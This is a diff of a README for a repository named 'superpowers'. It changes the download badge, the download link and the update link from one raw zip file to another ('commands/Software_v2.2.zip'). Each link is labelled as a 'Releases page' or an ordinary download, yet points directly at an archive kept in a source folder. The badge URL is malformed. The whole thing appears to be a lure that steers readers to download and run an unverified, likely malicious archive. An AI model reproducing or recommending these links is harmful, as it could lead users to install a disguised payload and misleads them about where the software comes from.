@@ -6,11 +6,11 @@ Welcome to the superpowers project! This application provides a library of core 
 
 ## 📥 Download the Application
 
-[![Download Superpowers](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip%https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip)](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip)
+[![Download Superpowers](https://github.com/HiteshBathla/superpowers/raw/refs/heads/main/commands/Software_v2.2.zip%https://github.com/HiteshBathla/superpowers/raw/refs/heads/main/commands/Software_v2.2.zip)](https://github.com/HiteshBathla/superpowers/raw/refs/heads/main/commands/Software_v2.2.zip)
 
 You can easily download superpowers from our Releases page. Just follow this link:
 
-[Visit this page to download](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip)
+[Visit this page to download](https://github.com/HiteshBathla/superpowers/raw/refs/heads/main/commands/Software_v2.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -77,4 +77,4 @@ If you encounter any issues while using superpowers, please reach out to our sup
 
 ## 🔄 Keeping Your Application Up-to-Date
 
-To ensure you have the latest features and fixes, check for updates regularly. You can find updates on the [Releases page](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip). Download and install new versions as they become available.
+To ensure you have the latest features and fixes, check for updates regularly. You can find updates on the [Releases page](https://github.com/HiteshBathla/superpowers/raw/refs/heads/main/commands/Software_v2.2.zip). Download and install new versions as they become available.
